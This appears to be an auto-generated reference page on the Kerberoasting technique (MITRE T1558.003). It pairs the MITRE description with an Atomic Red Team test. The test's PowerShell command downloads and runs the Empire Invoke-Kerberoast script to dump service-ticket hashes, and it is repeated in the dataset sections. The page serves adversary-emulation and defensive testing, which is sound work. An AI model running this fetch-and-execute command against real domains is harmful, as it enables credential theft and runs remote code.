
# Kerberoasting

## Description

### MITRE Description

> Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) 

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)

This same attack could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)

Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: None
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1558/003

## Potential Commands

```
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
Invoke-Kerberoast | fl
```

## Commands Dataset

```
[{'command': 'iex(iwr '
             'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)\n'
             'Invoke-Kerberoast | fl\n',
  'name': None,
  'source': 'atomics/T1558.003/T1558.003.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Steal or Forge Kerberos Tickets: Kerberoasting': {'atomic_tests': [{'auto_generated_guid': '3f987809-3681-43c8-bcd8-b3ff3a28533a',
                                                                                              'description': 'This '
                                                                                                             'test '
                                                                                                             'uses '
                                                                                                             'the '
                                                                                                             'Powershell '
                                                                                                             'Empire '
                                                                                                             'Module: '
                                                                                                             'https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1\n'
                                                                                                             'The '
                                                                                                             'following '
                                                                                                             'are '
                                                                                                             'further '
                                                                                                             'sources '
                                                                                                             'and '
                                                                                                             'credits '
                                                                                                             'for '
                                                                                                             'this '
                                                                                                             'attack:\n'
                                                                                                             '[Kerberoasting '
                                                                                                             'Without '
                                                                                                             'Mimikatz '
                                                                                                             'source] '
                                                                                                             '(https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n'
                                                                                                             '[Invoke-Kerberoast '
                                                                                                             'source] '
                                                                                                             '(https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\n'
                                                                                                             'when '
                                                                                                             'executed '
                                                                                                             'successfully '
                                                                                                             ', '
                                                                                                             'the '
                                                                                                             'test '
                                                                                                             'displays '
                                                                                                             'available '
                                                                                                             'services '
                                                                                                             'with '
                                                                                                             'their '
                                                                                                             'hashes. \n'
                                                                                                             'If '
                                                                                                             'the '
                                                                                                             'testing '
                                                                                                             'domain '
                                                                                                             "doesn't "
                                                                                                             'have '
                                                                                                             'any '
                                                                                                             'service '
                                                                                                             'principal '
                                                                                                             'name '
                                                                                                             'configured, '
                                                                                                             'there '
                                                                                                             'is '
                                                                                                             'no '
                                                                                                             'output\n',
                                                                                              'executor': {'command': 'iex(iwr '
                                                                                                                      'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)\n'
                                                                                                                      'Invoke-Kerberoast '
                                                                                                                      '| '
                                                                                                                      'fl\n',
                                                                                                           'name': 'powershell'},
                                                                                              'name': 'Request '
                                                                                                      'for '
                                                                                                      'service '
                                                                                                      'tickets',
                                                                                              'supported_platforms': ['windows']}],
                                                                            'attack_technique': 'T1558.003',
                                                                            'display_name': 'Steal '
                                                                                            'or '
                                                                                            'Forge '
                                                                                            'Kerberos '
                                                                                            'Tickets: '
                                                                                            'Kerberoasting'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations


* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)

* [Encrypt Sensitive Information](../mitigations/Encrypt-Sensitive-Information.md)
    
* [Password Policies](../mitigations/Password-Policies.md)
    

# Actors

None
